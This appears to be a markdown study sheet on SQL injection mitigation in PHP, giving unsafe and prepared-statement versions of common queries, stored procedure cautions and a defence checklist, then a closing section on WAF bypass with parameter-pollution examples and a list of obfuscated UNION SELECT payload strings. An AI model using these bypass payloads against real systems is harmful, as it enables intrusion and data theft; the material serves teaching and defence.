# SQLI mitigation

---

<details>
  <summary>Types</summary>

  
  - In-Band :
      - Error-Based
      - Union-Based
  - Blind :
      - Boolean-Based
      - Time-Based
  - Out-Of-Band :
      - Extract data via my server
    
  
</details>


---

<details>
  <summary>How To Get</summary>

- Try Single , Double quote and see if the response get 500 internal server error
- Try Single , Double quote and see if the response take time more than the usual

  
</details>


---

## **`mitigation`**




<details>
  <summary>Senarios</summary>



# Scenario 1: WHERE

❌ Unsafe

```
$sql = "SELECT * FROM users WHERE username='$username'";
```

The problem:

- The user controls part of the query.

✅ Correct

```
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```

Or

```
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(["username" => $username]);
```

---


# Scenario 2: Login

❌

```
$sql = "SELECT * FROM users
WHERE username='$user'AND password='$pass'";
```

✅

```
$stmt = $pdo->prepare("SELECT id,password
FROM usersWHERE username=?");

$stmt->execute([$user]);
```

Then

```
password_verify()
```

...instead of comparing passwords within the SQL query, if you are storing them in hashed form.

---


# Scenario 3: ID Number

❌

```
$id = $_GET['id'];$sql = "SELECT * FROM posts WHERE id=$id";
```

Even if you expect only numbers, do not rely on that alone.

✅

```
$id = filter_input(INPUT_GET,"id",FILTER_VALIDATE_INT);

$stmt = $pdo->prepare("SELECT * FROM posts
WHERE id=?");

$stmt->execute([$id]);
```

---


# Scenario 4: Search

❌

```
$sql="SELECT * FROM products
WHERE name LIKE '%$search%'";

```

✅

```
$stmt=$pdo->prepare("SELECT *FROM products
WHERE name LIKE ?");

$stmt->execute(["%$search%"]);

```

> Note that `%` is added to the **value**, not to the query body.

---


# Scenario 5: ORDER BY

Here is a very common mistake.

❌

```
$order=$_GET['sort'];

$sql="SELECT * FROM users
ORDER BY $order";
```

You cannot pass a column name as a parameter.

The solution here is a **whitelist**.

✅

```
$allowed=[
"name",
"age",
"email"
];

if(!in_array($order,$allowed)){
$order="name";
}

$sql="SELECT *
FROM users
ORDER BY $order";
```

Note that column names are not passed as `?` placeholders in most databases; therefore, you must restrict input to a specific, allowed list.

---

# Sixth scenario: ASC/DESC

❌

```
$dir=$_GET["dir"];

$sql="ORDER BY name $dir";
```

✅

```
$dir = strtoupper($dir);

if($dir!="ASC" && $dir!="DESC"){
$dir="ASC";
}

$sql="ORDER BY name $dir";
```

---


# Scenario 7: LIMIT

❌

```
$sql="LIMIT ".$_GET["limit"];
```

✅

```
$limit=(int)$_GET["limit"];

if($limit<1)
$limit=10;

if($limit>100)
$limit=100;

$sql="LIMIT $limit";
```

Some databases do not allow the use of parameters in `LIMIT` clauses; therefore, strict validation and type casting to an integer are important.


---

# Scenario 8: Table Name

❌

```
$table=$_GET["table"];

$sql="SELECT * FROM $table";
```

Do not use user input as a table name.

✅

```
$tables=[
"users",
"posts",
"comments"
];

if(!in_array($table,$tables))
exit;
```

---

# Scenario 9: Column name

❌

```
$field=$_GET["field"];

$sql="SELECT $field FROM users";
```

✅

Whitelist

```
$fields=[
"name",
"email",
"age"
];
```

Then just choose from this list.

---


# Scenario 10: IN

If you have multiple IDs:

❌

```
WHERE id IN ($ids)
```

If `$ids` is a string from a user, this is unsafe.

✅

Create the appropriate number of placeholders:

```
$ids=[3,7,9];

$placeholders=implode(
",",
array_fill(0,count($ids),"?
"));

$sql="SELECT *
FROM users
WHERE id IN($placeholders)";
```

Then pass the array to `execute()`.

---

# Scenario eleven: INSERT

❌

```
$sql="INSERT INTO users
(name,email)
VALUES('$name','$email')";
```

✅

```
$stmt=$pdo->prepare(
"INSERT INTO users
(name,email)
"VALUES(?,?)"
);

$stmt->execute([
$name,
$email
]);
```

---

# Scenario 12: UPDATE

❌

```
$sql="UPDATE users
SET name='$name'";
```

✅

```
$stmt=$pdo->prepare(
"UPDATE users
SET name=?
WHERE id=?"
);

$stmt->execute([
$name,
$id
]);
```

---


# Scenario thirteen: DELETE

❌

```
$sql="DELETE
FROM users
WHERE id=$id";
```

✅

```
$stmt=$pdo->prepare(
"DELETE
FROM users
WHERE id=?"
);

$stmt->execute([$id]);
```

---






| Injection Point   | Applicable techniques                                                            |
| ----------------- | -------------------------------------------------------------------------------- |
| WHERE             | Union-Based, Error-Based, Boolean-Based, Time-Based, Out-of-Band                 |
| Login Query       | Boolean-Based, Time-Based, Error-Based                                           |
| LIKE              | Union-Based, Error-Based, Blind                                                  |
| ORDER BY          | Query Structure Injection                                                        |
| LIMIT             | Query Structure Injection                                                        |
| Table/Column Name | Query Structure Injection (Whitelist only)                                       |
| INSERT / UPDATE   | May lead to Second-Order SQL Injection if the data is later used insecurely      |















  
</details>




<details>
  <summary>Stored procedures</summary>


A **Stored Procedure** is essentially a **function or small program stored within the database itself**.

Instead of the application sending a full SQL query:

```
SELECT * FROM users WHERE username = ?
```

The application sends:

```
CALL GetUserByUsername(?)
```

And the database is the one that executes the code stored within it.

So, instead of:

```
Application
      │
      ├── SQL Query
      ▼
Database
```

It becomes:

```
Application
      │
      ├── CALL Procedure
      ▼
Database
      │
      └── Pre-existing SQL
```

---

# Example

Instead of PHP executing:

```
$stmt = $pdo->prepare(
"SELECT * FROM users WHERE username=?"
);
```

It executes:

```
CALL GetUserByUsername(?)
```

And the database contains:

```
CREATE PROCEDURE GetUserByUsername(...)
BEGIN
    SELECT * FROM users
    WHERE username = username_param;
END;
```

---



# Do Stored Procedures Prevent SQL Injection?



**Sometimes yes, and sometimes no.**



---

## Case 1 (Safe)

If the procedure itself is written like this:

```
SELECT *
FROM users
WHERE username = username_param;
```

Then it is safe.

---

## Case 2 (Unsafe)

If the developer writes:

```
SET @sql =
CONCAT(
'SELECT * FROM users WHERE username="',
username_param,
'"'
);

PREPARE stmt FROM @sql;
EXECUTE stmt;
```

This is called

**Dynamic SQL**

And this is susceptible to SQL Injection.

In other words, simply using a Stored Procedure **does not guarantee security**.






  
</details>












































































```ruby

SQL Injection
│
├── Error Handling
│      └── لا تعرض Database Errors للمستخدم
│
├── Least Privilege
│      └── اجعل حساب قاعدة البيانات بأقل صلاحيات
│ 
├── WHERE
│      └── Prepared Statements
│
├── INSERT
│      └── Prepared Statements
│
├── UPDATE
│      └── Prepared Statements
│
├── DELETE
│      └── Prepared Statements
│
├── LIKE
│      └── Prepared Statements
│
├── IN
│      └── Dynamic Placeholders + Prepared Statements
│
├── ORDER BY
│      └── Whitelist
│
├── GROUP BY
│      └── Whitelist
│
├── HAVING
│      ├── إذا كانت Values → Prepared Statements
│      └── إذا كانت Columns/Functions → Whitelist
│
├── LIMIT
│      └── Integer Validation (+ Range Check)
│
├── OFFSET
│      └── Integer Validation (+ Range Check)
│
├── Table Name
│      └── Whitelist
│
├── Column Name
│      └── Whitelist
│
├── Stored Procedures
│      └── تجنب Dynamic SQL داخلها
│
├── ORM
│      ├── استخدم ORM APIs
│      └── تجنب Raw SQL
│
└── Second-Order SQL Injection
       └── استخدم Prepared Statements في كل استعلام يعيد استخدام البيانات

```


---

## Bypass 

**`https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF`**

<details>
  <summary>Bypass</summary>


- Using Upper and Lower Case
- Encoding
- ` /?id=1+un/**/ion+sel/**/ect+1,2,3–`
- ` will be successfully performed/?id=1/*union*/union/*select*/select+1,2,3/*`
- ` /?id=1;select+1&id=2,3+from+users+where+id=1–`
- /?id=1/**/union/*&id=*/select/*&id=*/pwd/*&id=*/from/*&id=*/users`
- /?a=1+union/*&b=*/select+1,pass/*&c=*/from+users–`


<details>
  <summary>example_1</summary>


-   Example Number (1) of a vulnerability in the function of request Normalization. - The following request doesn't allow anyone to conduct an attack
    -   `/?id=1+union+select+1,2,3/*`
-   If there is a corresponding vulnerability in the WAF, this request
    -   `will be successfully performed/?id=1/*union*/union/*select*/select+1,2,3/*`
-   After being processed by WAF, the request will become
    -   `index.php?id=1/*uni X on*/union/*sel X ect*/select+1,2,3/*`


  
</details>


<details>
  <summary>Example_2</summary>

-   The given example works in case of cleaning of dangerous traffic, not in case of blocking the entire request or the attack source. Example Number (2) of a vulnerability in the function of request Normalization. - Similarly, the following request doesn't allow anyone to conduct an attack
    -   `/?id=1+union+select+1,2,3/*`
-   If there is a corresponding vulnerability in the WAF, this request will be successfully performed
    -   `/?id=1+un/**/ion+sel/**/ect+1,2,3--`
-   The SQL request will become
    -   `SELECT * from table where id =1 union select 1,2,3--`
-   *Instead of construction /**/, any symbol sequence that WAF cuts off can be used (e.g., #####, %00).*
-   *The given example works in case of excessive cleaning of incoming data (replacement of a regular expression with the empty string).*

  
</details>


<details>
  <summary>Example_3</summary>


- **Using HTTP Parameter Pollution (HPP)**
- The following request doesn’t allow anyone to conduct an attack
    - ` /?id=1;select+1,2,3+from+users+where+id=1–`
- This request will be successfully performed using HPP
    - ` /?id=1;select+1&id=2,3+from+users+where+id=1–`

  
</details>

<details>
  <summary>Example_4</summary>


- **Using HTTP Parameter Pollution (HPP)**
- Vulnerable code
    - ` SQL=” select key from table where id= “+Request.QueryString(“id”)`
- This request is successfully performed using the HPP technique
    - /?id=1/**/union/*&id=*/select/*&id=*/pwd/*&id=*/from/*&id=*/users`
- The SQL request becomes select key from table where
    - ` id=1/**/union/*,*/select/*,*/pwd/*,*/from/*,*/users`


  
</details>

<details>
  <summary>Example_5</summary>

- **ByPassing WAF: SQL Injection – HPF** Using HTTP Parameter Fragmentation (HPF)
- Vulnerable code example
    - ` Query(“select * from table where a=”.$_GET[‘a’].” and b=”.$_GET[‘b’]);
    - Query(“select * from table where a=”.$_GET[‘a’].” and b=”.$_GET[‘b’].” limit”.$_GET[‘c’]);`
- The following request doesn’t allow anyone to conduct an attack
    - ` /?a=1+union+select+1,2/*`
- These requests may be successfully performed using HPF
    - ` /?a=1+union/*&b=*/select+1,2
    - /?a=1+union/*&b=*/select+1,pass/*&c=*/from+users–`
- The SQL requests become
    - ` select * from table where a=1 union/* and b=*/select 1,2*
    - *select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users–`


  
</details>






---

<details>
  <summary>- WAF Bypassing Strings</summary>



```
/!%55NiOn/ /!%53eLEct/
%55nion(%53elect 1,2,3)– -
+union+distinct+select+
+union+distinctROW+select+
///!12345UNION SELECT///
concat(0x223e,@@version)
concat(0x273e27,version(),0x3c212d2d)
concat(0x223e3c62723e,version(),0x3c696d67207372633d22)
concat(0x223e,@@version,0x3c696d67207372633d22)
concat(0x223e,0x3c62723e3c62723e3c62723e,@@version,0x3c696d67207372633d22,0x3c62723e)
concat(0x223e3c62723e,@@version,0x3a,”BlackRose”,0x3c696d67207372633d22)
concat(‘’,@@version,’’)
///!50000UNION SELECT///
//UNION///!50000SELECT///
/!50000UniON SeLeCt/
union /!50000%53elect/
+#uNiOn+#sEleCt
+#1q%0AuNiOn all#qa%0A#%0AsEleCt
/!%55NiOn/ /!%53eLEct/
/!u%6eion/ /!se%6cect/
+un//ion+se//lect
uni%0bon+se%0blect
%2f%2funion%2f*%2fselect
union%23foo%2Fbar%0D%0Aselect%23foo%0D%0A
REVERSE(noinu)+REVERSE(tceles)
/–/union/–/select/–/
union (/!/*/ SeleCT */ 1,2,3)
/!union/+/!select/
union+/!select/
//union//select//
//uNIon//sEleCt//
///*!union*////!select///
/*!uNIOn*/ /*!SelECt*/
+union+distinct+select+
+union+distinctROW+select+
+UnIOn%0d%0aSeleCt%0d%0a
UNION/*&test=1*/SELECT/*&pwn=2*/
un?+un//ion+se//lect+
+UNunionION+SEselectLECT+
+uni%0bon+se%0blect+
%252f%252a*/union%252f%252a /select%252f%252a*/
/%2A%2A/union/%2A%2A/select/%2A%2A/
%2f%2funion%2f%2fselect%2f%2f
union%23foo%2Fbar%0D%0Aselect%23foo%0D%0A
/!UnIoN*/SeLecT+
```



  
</details>





 

  
</details>






































































